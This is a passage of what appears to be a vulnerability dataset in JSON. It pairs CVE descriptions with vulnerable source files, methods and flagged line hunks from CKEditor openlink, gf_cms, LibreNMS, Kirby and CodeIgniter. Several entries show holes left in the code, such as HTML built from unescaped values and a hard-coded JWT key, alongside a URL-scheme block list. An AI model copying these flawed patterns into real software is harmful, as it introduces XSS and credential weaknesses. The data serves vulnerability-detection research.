    "description": "ckeditor-plugin-openlink is a plugin for the CKEditor JavaScript text editor that extends the context menu with a possibility to open a link in a new tab. A vulnerability in versions of the plugin prior to 1.0.7 allowed a user to execute JavaScript code by abusing the link href attribute. The fix is available starting with version 1.0.7.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugin.js",
          "content": "/**\n * @license Copyright (c) 2003-2018, CKSource - Frederico Knabben. All rights reserved.\n * For licensing, see LICENSE.md or http://ckeditor.com/license\n */\n\n/**\n * @fileOverview The \"openlink\" plugin.\n *\n */\n\n'use strict';\n\n( function() {\n\n\tCKEDITOR.plugins.add( 'openlink', {\n\t\tlang: 'bg,en,de,de-ch,pl,ru,uk', // %REMOVE_LINE_CORE%\n\t\ticons: 'openLink', // %REMOVE_LINE_CORE%\n\t\thidpi: true, // %REMOVE_LINE_CORE%\n\t\trequires: 'link,contextmenu',\n\n\t\tonLoad: function() {\n\t\t\tCKEDITOR.addCss( '.openlink a:hover{ cursor: pointer; }' );\n\t\t},\n\n\t\tinit: function( editor ) {\n\t\t\tvar target = editor.config.openlink_target || '_blank',\n\t\t\t\topenLinkInstance = new OpenLinkPlugin( editor, editor.config );\n\n\t\t\t// Register openLink command.\n\t\t\teditor.addCommand( 'openLink', {\n\t\t\t\texec: function( editor ) {\n\t\t\t\t\tvar linkElement = getActiveLink( editor ),\n\t\t\t\t\t\turl;\n\n\t\t\t\t\tif ( linkElement ) {\n\t\t\t\t\t\turl = linkElement.getAttribute( 'href' );\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( url && isValidUrl( url ) ) {\n\t\t\t\t\t\twindow.open( url, target );\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} );\n\n\t\t\t// Register menu items.\n\t\t\tif ( editor.addMenuItems ) {\n\t\t\t\teditor.addMenuItems( {\n\t\t\t\t\topenLink: {\n\t\t\t\t\t\tlabel: editor.lang.openlink.menu,\n\t\t\t\t\t\tcommand: 'openLink',\n\t\t\t\t\t\tgroup: 'link',\n\t\t\t\t\t\torder: -1\n\t\t\t\t\t}\n\t\t\t\t} );\n\t\t\t}\n\n\t\t\t// If the \"contextmenu\" plugin is loaded, register the listeners.\n\t\t\teditor.contextMenu.addListener( function( element, selection ) {\n\t\t\t\tif ( !element ) {\n\t\t\t\t\treturn null;\n\t\t\t\t}\n\n\t\t\t\tvar anchor = getActiveLink( editor );\n\n\t\t\t\tif ( anchor && isValidUrl( anchor.getAttribute( 'href' ) ) ) {\n\t\t\t\t\treturn {\n\t\t\t\t\t\topenLink: CKEDITOR.TRISTATE_OFF\n\t\t\t\t\t};\n\t\t\t\t}\n\n\t\t\t\treturn {};\n\t\t\t} );\n\n\t\t\t// A quick workaround for issue #11842.\n\t\t\teditor.on( 'contentDom', function( evt ) {\n\t\t\t\tvar editable = editor.editable();\n\n\t\t\t\t// We want to be able to open links also in read-only mode. This\n\t\t\t\t// listener will open link in new tab.\n\t\t\t\teditable.attachListener( editable, 'click', function( evt ) {\n\t\t\t\t\t// This feature should be available in:\n\t\t\t\t\t// * wysywigmode in read-only\n\t\t\t\t\t// * wysywigmode when ctrl key is down\n\t\t\t\t\tvar target = evt.data.getTarget(),\n\t\t\t\t\t\tclickedAnchor = ( new CKEDITOR.dom.elementPath( target, editor.editable() ) ).contains( 'a' ),\n\t\t\t\t\t\thref = clickedAnchor && clickedAnchor.getAttribute( 'href' ),\n\t\t\t\t\t\tmodifierPressed = openLinkInstance.properModifierPressed( evt );\n\n\t\t\t\t\tif ( editor.readOnly && !editor.config.openlink_enableReadOnly ) {\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( isValidUrl( href ) && modifierPressed ) {\n\t\t\t\t\t\twindow.open( href, target );\n\n\t\t\t\t\t\t// We need to prevent it for Firefox, as it has it's own handling (#8).\n\t\t\t\t\t\tevt.data.preventDefault();\n\t\t\t\t\t}\n\t\t\t\t} );\n\n\t\t\t\tif ( openLinkInstance.modifierRequired() ) {\n\t\t\t\t\t// Keyboard listeners are needed only if any modifier is required to open clicked link.\n\t\t\t\t\teditable.attachListener( editable, 'keydown', openLinkInstance.onKeyPress, openLinkInstance );\n\t\t\t\t\teditable.attachListener( editable, 'keyup', openLinkInstance.onKeyPress, openLinkInstance );\n\t\t\t\t} else {\n\t\t\t\t\t// If any clicks should trigger link open, then just add the class to the editable.\n\t\t\t\t\teditor.editable().addClass( 'openlink' );\n\t\t\t\t}\n\n\t\t\t} );\n\t\t}\n\t} );\n\n\t// Returns the element of active (currently focused) link.\n\t// It has also support for linked image2 instance.\n\t// @return {CKEDITOR.dom.element}\n\tfunction getActiveLink( editor ) {\n\t\tvar anchor = CKEDITOR.plugins.link.getSelectedLink( editor ),\n\t\t\t// We need to do some special checking against widgets availability.\n\t\t\tactiveWidget = editor.widgets && editor.widgets.focused;\n\n\t\t// If default way of getting links didn't return anything useful\n\t\tif ( !anchor && activeWidget && activeWidget.name == 'image' && activeWidget.parts.link ) {\n\t\t\t// Since CKEditor 4.4.0 image widgets may be linked.\n\t\t\tanchor = activeWidget.parts.link;\n\t\t}\n\n\t\treturn anchor;\n\t}\n\n\t/**\n\t * Tells whether given URL might be opened.\n\t *\n\t * @param {String} url URL to be checked.\n\t * @returns {Boolean}\n\t */\n\tfunction isValidUrl( url ) {\n\t\tvar disallowedProtocols = [ 'javascript:', 'data:', 'blob:', 'file:' ];\n\n\t\tif ( url ) {\n\t\t\tfor ( var i = 0; i < disallowedProtocols.length; i++ ) {\n\t\t\t\t// IE8 compatible trimStart & startsWith :).\n\t\t\t\tif ( url.replace(/^\\s+/, '').toLowerCase().indexOf( disallowedProtocols[ i ] ) === 0 ) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}\n\n\t/**\n\t * OpenLink plugin type, groups all the functions related to plugin.\n\t *\n\t * @class CKEDITOR.plugins.openlink\n\t * @param {CKEDITOR.editor} editor\n\t * @param {CKEDITOR.config} config\n\t */\n\tfunction OpenLinkPlugin( editor, config ) {\n\t\tthis.editor = editor;\n\t\tthis.modifier = typeof config.openlink_modifier != 'undefined' ? config.openlink_modifier : CKEDITOR.CTRL;\n\t}\n\n\t/**\n\t * Whether configuration requires __any__ modifier key to be hold in order to open the link.\n\t *\n\t * @returns {Boolean}\n\t */\n\tOpenLinkPlugin.prototype.modifierRequired = function() {\n\t\treturn this.modifier !== 0;\n\t};\n\n\t/**\n\t * Tells if `evt` has proper modifier keys pressed.\n\t *\n\t * **Note:** it will return `true` if modifier is not required.\n\t *\n\t * @param {CKEDITOR.dom.event} evt\n\t * @returns {Boolean}\n\t */\n\tOpenLinkPlugin.prototype.properModifierPressed = function( evt ) {\n\t\treturn !this.modifierRequired() || ( evt.data.getKeystroke() & this.modifier );\n\t};\n\n\t/**\n\t * Method to be called upon `keydown`, `keyup` events.\n\t *\n\t * @param {CKEDITOR.dom.event} evt\n\t */\n\tOpenLinkPlugin.prototype.onKeyPress = function( evt ) {\n\t\tif ( this.properModifierPressed( evt ) ) {\n\t\t\tthis.editor.editable().addClass( 'openlink' );\n\t\t} else {\n\t\t\tthis.editor.editable().removeClass( 'openlink' );\n\t\t}\n\t};\n\n\tCKEDITOR.plugins.openlink = OpenLinkPlugin;\n} )();\n"
        }
      ],
      "method_level": [
        "function isValidUrl( url ) {\n\t\tvar disallowedProtocols = [ 'javascript:', 'data:', 'blob:', 'file:' ];\n\n\t\tif ( url ) {\n\t\t\tfor ( var i = 0; i < disallowedProtocols.length; i++ ) {\n\t\t\t\t// IE8 compatible trimStart & startsWith :).\n\t\t\t\tif ( url.replace(/^\\s+/, '').toLowerCase().indexOf( disallowedProtocols[ i ] ) === 0 ) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 142,
          "content": "\t\t\t\t// IE8 compatible trimStart & startsWith :)."
        },
        {
          "line_no": 143,
          "content": "\t\t\t\tif ( url.replace(/^\\s+/, '').toLowerCase().indexOf( disallowedProtocols[ i ] ) === 0 ) {"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1102,
    "cve": "CVE-2024-8005",
    "description": "A vulnerability was found in demozx gf_cms 1.0/1.0.1. It has been classified as critical. This affects the function init of the file internal/logic/auth/auth.go of the component JWT Authentication. The manipulation leads to hard-coded credentials. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.0.2 is able to address this issue. The patch is named be702ada7cb6fdabc02689d90b38139c827458a5. It is recommended to upgrade the affected component.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/logic/auth/auth.go",
          "content": "package auth\n\nimport (\n\t\"context\"\n\t\"gf_cms/internal/logic/admin\"\n\t\"gf_cms/internal/model\"\n\t\"gf_cms/internal/service\"\n\t\"time\"\n\n\tjwt \"github.com/gogf/gf-jwt/v2\"\n\t\"github.com/gogf/gf/v2/frame/g\"\n)\n\nvar authService *jwt.GfJWTMiddleware\n\ntype (\n\tsAuth struct{}\n)\n\nvar (\n\tinsAuth = sAuth{}\n)\n\nfunc Auth() *sAuth {\n\treturn &insAuth\n}\n\nfunc (*sAuth) JWTAuth() *jwt.GfJWTMiddleware {\n\treturn authService\n}\n\nfunc init() {\n\tservice.RegisterAuth(New())\n\n\tauth := jwt.New(&jwt.GfJWTMiddleware{\n\t\tRealm:           \"test zone\",\n\t\tKey:             []byte(\"secret key\"),\n\t\tTimeout:         time.Minute * 5,\n\t\tMaxRefresh:      time.Minute * 5,\n\t\tIdentityKey:     \"id\",\n\t\tTokenLookup:     \"header: Authorization, query: token, cookie: jwt\",\n\t\tTokenHeadName:   \"Bearer\",\n\t\tTimeFunc:        time.Now,\n\t\tAuthenticator:   Auth().Authenticator,\n\t\tUnauthorized:    Auth().Unauthorized,\n\t\tPayloadFunc:     Auth().PayloadFunc,\n\t\tIdentityHandler: Auth().IdentityHandler,\n\t})\n\tauthService = auth\n}\n\nfunc New() *sAuth {\n\treturn &sAuth{}\n}\n\n// PayloadFunc is a callback function that will be called during login.\n// Using this function it is possible to add additional payload data to the webtoken.\n// The data is then made available during requests via c.Get(\"JWT_PAYLOAD\").\n// Note that the payload is not encrypted.\n// The attributes mentioned on jwt.io can't be used as keys for the map.\n// Optional, by default no additional data will be set.\nfunc (*sAuth) PayloadFunc(data interface{}) jwt.MapClaims {\n\tclaims := jwt.MapClaims{}\n\tparams := data.(map[string]interface{})\n\tif len(params) > 0 {\n\t\tfor k, v := range params {\n\t\t\tclaims[k] = v\n\t\t}\n\t}\n\treturn claims\n}\n\n// IdentityHandler get the identity from JWT and set the identity for every request\n// Using this function, by r.GetParam(\"id\") get identity\nfunc (*sAuth) IdentityHandler(ctx context.Context) interface{} {\n\tclaims := jwt.ExtractClaims(ctx)\n\treturn claims[authService.IdentityKey]\n}\n\n// Unauthorized is used to define customized Unauthorized callback function.\nfunc (*sAuth) Unauthorized(ctx context.Context, code int, message string) {\n\tr := g.RequestFromCtx(ctx)\n\tr.Response.WriteJson(g.Map{\n\t\t\"code\":    code,\n\t\t\"message\": message,\n\t})\n\tr.ExitAll()\n}\n\n// Authenticator is used to validate login parameters.\n// It must return user data as user identifier, it will be stored in Claim Array.\n// if your identityKey is 'id', your user data must have 'id'\n// CheckByRoleId error (e) to determine the appropriate error message.\nfunc (*sAuth) Authenticator(ctx context.Context) (interface{}, error) {\n\tvar (\n\t\tr  = g.RequestFromCtx(ctx)\n\t\tin model.AdminLoginInput\n\t)\n\tif err := r.Parse(&in); err != nil {\n\t\treturn \"\", err\n\t}\n\n\tif user := admin.Admin().GetUserByUserNamePassword(ctx, in); user != nil {\n\t\treturn user, nil\n\t}\n\n\treturn nil, jwt.ErrFailedAuthentication\n}\n"
        }
      ],
      "method_level": [
        "func init() {\n\tservice.RegisterAuth(New())\n\n\tauth := jwt.New(&jwt.GfJWTMiddleware{\n\t\tRealm:           \"test zone\",\n\t\tKey:             []byte(\"secret key\"),\n\t\tTimeout:         time.Minute * 5,\n\t\tMaxRefresh:      time.Minute * 5,\n\t\tIdentityKey:     \"id\",\n\t\tTokenLookup:     \"header: Authorization, query: token, cookie: jwt\",\n\t\tTokenHeadName:   \"Bearer\",\n\t\tTimeFunc:        time.Now,\n\t\tAuthenticator:   Auth().Authenticator,\n\t\tUnauthorized:    Auth().Unauthorized,\n\t\tPayloadFunc:     Auth().PayloadFunc,\n\t\tIdentityHandler: Auth().IdentityHandler,\n\t})\n\tauthService = auth\n}"
      ],
      "hunk_level": [
        {
          "line_no": 36,
          "content": "\t\tRealm:           \"test zone\","
        },
        {
          "line_no": 37,
          "content": "\t\tKey:             []byte(\"secret key\"),"
        }
      ]
    },
    "cwe": [
      "CWE-798"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.9,
    "cvss_version": 4.0
  },
  {
    "id": 1290,
    "cve": "CVE-2024-50350",
    "description": "LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. A Stored Cross-Site Scripting (XSS) vulnerability in the \"Port Settings\" page allows authenticated users to inject arbitrary JavaScript through the \"name\" parameter when creating a new Port Group. This vulnerability results in the execution of malicious code when the \"Port Settings\" page is visited after the affected Port Group is added to a device, potentially compromising user sessions and allowing unauthorized actions. This vulnerability is fixed in 24.10.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Http/Controllers/Table/EditPortsController.php",
          "content": "<?php\n/*\n * EditPortsController.php\n *\n * -Description-\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n *\n * @package    LibreNMS\n * @link       http://librenms.org\n * @copyright  2021 Tony Murray\n * @author     Tony Murray <murraytony@gmail.com>\n */\n\nnamespace App\\Http\\Controllers\\Table;\n\nclass EditPortsController extends TableController\n{\n    public function rules()\n    {\n        return [\n            'device_id' => 'required|int',\n            'device_group' => 'nullable|int',\n            'eventtype' => 'nullable|string',\n        ];\n    }\n\n    public function searchFields($request)\n    {\n        return ['ifName', 'ifAlias', 'ifDescr'];\n    }\n\n    protected function sortFields($request)\n    {\n        return ['ifIndex', 'ifName', 'ifAdminStatus', 'ifOperStatus', 'ifSpeed', 'ifAlias'];\n    }\n\n    protected function baseQuery($request)\n    {\n        return \\App\\Models\\Port::where('device_id', $request->get('device_id'))\n            ->with('groups');\n    }\n\n    /**\n     * @param  \\App\\Models\\Port  $port\n     * @return array\n     */\n    public function formatItem($port)\n    {\n        $is_port_bad = $port->ifAdminStatus != 'down' && $port->ifOperStatus != 'up';\n        $do_we_care = ($port->ignore || $port->disabled) ? false : $is_port_bad;\n        $out_of_sync = $do_we_care ? \"class='red'\" : '';\n        $tune = $port->device->getAttrib('ifName_tune:' . $port->ifName) == 'true' ? 'checked' : '';\n\n        $port_group_options = '';\n        foreach ($port->groups as $group) {\n            /** @var \\App\\Models\\PortGroup $group */\n            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';\n        }\n\n        return [\n            'ifIndex' => $port->ifIndex,\n            'ifName' => $port->getLabel(),\n            'ifAdminStatus' => $port->ifAdminStatus,\n            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',\n            'disabled' => '<input type=\"checkbox\" class=\"disable-check\" data-size=\"small\" name=\"disabled_' . $port->port_id . '\"' . ($port->disabled ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"olddis_' . $port->port_id . '\" value=\"' . ($port->disabled ? 1 : 0) . '\"\">',\n            'ignore' => '<input type=\"checkbox\" class=\"ignore-check\" data-size=\"small\" name=\"ignore_' . $port->port_id . '\"' . ($port->ignore ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"oldign_' . $port->port_id . '\" value=\"' . ($port->ignore ? 1 : 0) . '\"\">',\n            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',\n            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',\n            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',\n            'portGroup' => '<div class=\"form-group has-feedback\"><select class=\"input-sm port_group_select\" name=\"port_group_' . $port->port_id . '[]\"  data-port_id=\"' . $port->port_id . '\" multiple>' . $port_group_options . '</select></div>',\n        ];\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function formatItem($port)\n    {\n        $is_port_bad = $port->ifAdminStatus != 'down' && $port->ifOperStatus != 'up';\n        $do_we_care = ($port->ignore || $port->disabled) ? false : $is_port_bad;\n        $out_of_sync = $do_we_care ? \"class='red'\" : '';\n        $tune = $port->device->getAttrib('ifName_tune:' . $port->ifName) == 'true' ? 'checked' : '';\n\n        $port_group_options = '';\n        foreach ($port->groups as $group) {\n            /** @var \\App\\Models\\PortGroup $group */\n            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';\n        }\n\n        return [\n            'ifIndex' => $port->ifIndex,\n            'ifName' => $port->getLabel(),\n            'ifAdminStatus' => $port->ifAdminStatus,\n            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',\n            'disabled' => '<input type=\"checkbox\" class=\"disable-check\" data-size=\"small\" name=\"disabled_' . $port->port_id . '\"' . ($port->disabled ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"olddis_' . $port->port_id . '\" value=\"' . ($port->disabled ? 1 : 0) . '\"\">',\n            'ignore' => '<input type=\"checkbox\" class=\"ignore-check\" data-size=\"small\" name=\"ignore_' . $port->port_id . '\"' . ($port->ignore ? 'checked' : '') . '>\n                               <input type=\"hidden\" name=\"oldign_' . $port->port_id . '\" value=\"' . ($port->ignore ? 1 : 0) . '\"\">',\n            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',\n            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',\n            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',\n            'portGroup' => '<div class=\"form-group has-feedback\"><select class=\"input-sm port_group_select\" name=\"port_group_' . $port->port_id . '[]\"  data-port_id=\"' . $port->port_id . '\" multiple>' . $port_group_options . '</select></div>',\n        ];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 69,
          "content": "            $port_group_options .= '<option value=\"' . $group->id . '\" selected>' . $group->name . '</option>';"
        },
        {
          "line_no": 74,
          "content": "            'ifName' => $port->getLabel(),"
        },
        {
          "line_no": 75,
          "content": "            'ifAdminStatus' => $port->ifAdminStatus,"
        },
        {
          "line_no": 76,
          "content": "            'ifOperStatus' => '<span id=\"operstatus_' . $port->port_id . '\" ' . $out_of_sync . '>' . $port->ifOperStatus . '</span>',"
        },
        {
          "line_no": 81,
          "content": "            'port_tune' => '<input type=\"checkbox\" name=\"override_config\" data-attrib=\"ifName_tune:' . $port->ifName . '\" data-device_id=\"' . $port->device_id . '\" data-size=\"small\" ' . $tune . '>',"
        },
        {
          "line_no": 82,
          "content": "            'ifAlias' => '<div class=\"form-group\"><input class=\"form-control input-sm\" name=\"if-alias\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifAlias . '\"><span class=\"form-control-feedback\"><i class=\"fa\" aria-hidden=\"true\"></i></span></div>',"
        },
        {
          "line_no": 83,
          "content": "            'ifSpeed' => '<div class=\"form-group has-feedback\"><input type=\"text\" pattern=\"[0-9]*\" inputmode=\"numeric\" class=\"form-control input-sm\" name=\"if-speed\" data-device_id=\"' . $port->device_id . '\" data-port_id=\"' . $port->port_id . '\" data-ifName=\"' . $port->ifName . '\" value=\"' . $port->ifSpeed . '\"><span class=\"form-control-feedback\"><i class=\"fas\" aria-hidden=\"true\"></i></span></div>',"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 370,
    "cve": "CVE-2024-27087",
    "description": "Kirby is a content management system. The new link field introduced in Kirby 4 allows several different link types that each validate the entered link to the relevant URL format. It also includes a \"Custom\" link type for advanced use cases that don't fit any of the pre-defined link formats.  As the \"Custom\" link type is meant to be flexible, it also allows the javascript: URL scheme. In some use cases this can be intended, but it can also be misused by attackers to execute arbitrary JavaScript code when a user or visitor clicks on a link that is generated from the contents of the link field. This vulnerability is patched in 4.1.1.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "tests/Form/Fields/LinkFieldTest.php",
          "content": "<?php\n\nnamespace Form\\Fields;\n\nuse Kirby\\Form\\Fields\\TestCase;\n\nclass LinkFieldTest extends TestCase\n{\n\tpublic function testDefaultProps()\n\t{\n\t\t$field = $this->field('link');\n\n\t\t$this->assertSame('link', $field->type());\n\t\t$this->assertSame('link', $field->name());\n\t\t$this->assertSame('', $field->value());\n\t\t$this->assertNull($field->label());\n\t\t$this->assertNull($field->text());\n\t\t$this->assertTrue($field->save());\n\t\t$this->assertNull($field->after());\n\t\t$this->assertNull($field->before());\n\t\t$this->assertNull($field->icon());\n\t\t$this->assertNull($field->placeholder());\n\t\t$this->assertSame([\n\t\t\t'url',\n\t\t\t'page',\n\t\t\t'file',\n\t\t\t'email',\n\t\t\t'tel',\n\t\t\t'anchor',\n\t\t\t'custom'\n\t\t], $field->options());\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function testDefaultProps()\n\t{\n\t\t$field = $this->field('link');\n\n\t\t$this->assertSame('link', $field->type());\n\t\t$this->assertSame('link', $field->name());\n\t\t$this->assertSame('', $field->value());\n\t\t$this->assertNull($field->label());\n\t\t$this->assertNull($field->text());\n\t\t$this->assertTrue($field->save());\n\t\t$this->assertNull($field->after());\n\t\t$this->assertNull($field->before());\n\t\t$this->assertNull($field->icon());\n\t\t$this->assertNull($field->placeholder());\n\t\t$this->assertSame([\n\t\t\t'url',\n\t\t\t'page',\n\t\t\t'file',\n\t\t\t'email',\n\t\t\t'tel',\n\t\t\t'anchor',\n\t\t\t'custom'\n\t\t], $field->options());\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 29,
          "content": "\t\t\t'anchor',"
        },
        {
          "line_no": 30,
          "content": "\t\t\t'custom'"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.6,
    "cvss_version": 3.1
  },
  {
    "id": 12,
    "cve": "CVE-2025-24013",
    "description": "CodeIgniter is a PHP full-stack web framework. Prior to 4.5.8, CodeIgniter lacked proper header validation for its name and value. The potential attacker can construct deliberately malformed headers with Header class. This could disrupt application functionality, potentially causing errors or generating invalid HTTP requests. In some cases, these malformed requests might lead to a DoS scenario if a remote service’s web application firewall interprets them as malicious and blocks further communication with the application. This vulnerability is fixed in 4.5.8.",
    "vulnerability": {
      "file_level": [
        {
          "name": "system/HTTP/Header.php",
          "content": "<?php\n\ndeclare(strict_types=1);\n\n/**\n * This file is part of CodeIgniter 4 framework.\n *\n * (c) CodeIgniter Foundation <admin@codeigniter.com>\n *\n * For the full copyright and license information, please view\n * the LICENSE file that was distributed with this source code.\n */\n\nnamespace CodeIgniter\\HTTP;\n\nuse Stringable;\n\n/**\n * Class Header\n *\n * Represents a single HTTP header.\n *\n * @see \\CodeIgniter\\HTTP\\HeaderTest\n */\nclass Header implements Stringable\n{\n    /**\n     * The name of the header.\n     *\n     * @var string\n     */\n    protected $name;\n\n    /**\n     * The value of the header. May have more than one\n     * value. If so, will be an array of strings.\n     * E.g.,\n     *   [\n     *       'foo',\n     *       [\n     *           'bar' => 'fizz',\n     *       ],\n     *       'baz' => 'buzz',\n     *   ]\n     *\n     * @var array<int|string, array<string, string>|string>|string\n     */\n    protected $value;\n\n    /**\n     * Header constructor. name is mandatory, if a value is provided, it will be set.\n     *\n     * @param array<int|string, array<string, string>|string>|string|null $value\n     */\n    public function __construct(string $name, $value = null)\n    {\n        $this->name = $name;\n        $this->setValue($value);\n    }\n\n    /**\n     * Returns the name of the header, in the same case it was set.\n     */\n    public function getName(): string\n    {\n        return $this->name;\n    }\n\n    /**\n     * Gets the raw value of the header. This may return either a string\n     * or an array, depending on whether the header has multiple values or not.\n     *\n     * @return array<int|string, array<string, string>|string>|string\n     */\n    public function getValue()\n    {\n        return $this->value;\n    }\n\n    /**\n     * Sets the name of the header, overwriting any previous value.\n     *\n     * @return $this\n     */\n    public function setName(string $name)\n    {\n        $this->name = $name;\n\n        return $this;\n    }\n\n    /**\n     * Sets the value of the header, overwriting any previous value(s).\n     *\n     * @param array<int|string, array<string, string>|string>|string|null $value\n     *\n     * @return $this\n     */\n    public function setValue($value = null)\n    {\n        $this->value = is_array($value) ? $value : (string) $value;\n\n        return $this;\n    }\n\n    /**\n     * Appends a value to the list of values for this header. If the\n     * header is a single value string, it will be converted to an array.\n     *\n     * @param array<string, string>|string|null $value\n     *\n     * @return $this\n     */\n    public function appendValue($value = null)\n    {\n        if ($value === null) {\n            return $this;\n        }\n\n        if (! is_array($this->value)) {\n            $this->value = [$this->value];\n        }\n\n        if (! in_array($value, $this->value, true)) {\n            $this->value[] = is_array($value) ? $value : (string) $value;\n        }\n\n        return $this;\n    }\n\n    /**\n     * Prepends a value to the list of values for this header. If the\n     * header is a single value string, it will be converted to an array.\n     *\n     * @param array<string, string>|string|null $value\n     *\n     * @return $this\n     */\n    public function prependValue($value = null)\n    {\n        if ($value === null) {\n            return $this;\n        }\n\n        if (! is_array($this->value)) {\n            $this->value = [$this->value];\n        }\n\n        array_unshift($this->value, $value);\n\n        return $this;\n    }\n\n    /**\n     * Retrieves a comma-separated string of the values for a single header.\n     *\n     * NOTE: Not all header values may be appropriately represented using\n     * comma concatenation. For such headers, use getHeader() instead\n     * and supply your own delimiter when concatenating.\n     *\n     * @see https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2\n     */\n    public function getValueLine(): string\n    {\n        if (is_string($this->value)) {\n            return $this->value;\n        }\n        if (! is_array($this->value)) {\n            return '';\n        }\n\n        $options = [];\n\n        foreach ($this->value as $key => $value) {\n            if (is_string($key) && ! is_array($value)) {\n                $options[] = $key . '=' . $value;\n            } elseif (is_array($value)) {\n                $key       = key($value);\n                $options[] = $key . '=' . $value[$key];\n            } elseif (is_numeric($key)) {\n                $options[] = $value;\n            }\n        }\n\n        return implode(', ', $options);\n    }\n\n    /**\n     * Returns a representation of the entire header string, including\n     * the header name and all values converted to the proper format.\n     */\n    public function __toString(): string\n    {\n        return $this->name . ': ' . $this->getValueLine();\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(string $name, $value = null)\n    {\n        $this->name = $name;\n        $this->setValue($value);\n    }",
        "public function setValue($value = null)\n    {\n        $this->value = is_array($value) ? $value : (string) $value;\n\n        return $this;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "        $this->name = $name;"
        },
        {
          "line_no": 101,
          "content": "        $this->value = is_array($value) ? $value : (string) $value;"
        }
      ]
    },
    "cwe": [
      "CWE-436"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 65,
    "cve": "CVE-2025-25293",
    "description": "ruby-saml provides security assertion markup language (SAML) single sign-on (SSO) for Ruby. Prior to versions 1.12.4 and 1.18.0, ruby-saml is susceptible to remote Denial of Service (DoS) with compressed SAML responses. ruby-saml uses zlib to decompress SAML responses in case they're compressed. It is possible to bypass the message size check with a compressed assertion since the message size is checked before inflation and not after. This issue may lead to remote Denial of Service (DoS). Versions 1.12.4 and 1.18.0 fix the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/onelogin/ruby-saml/saml_message.rb",
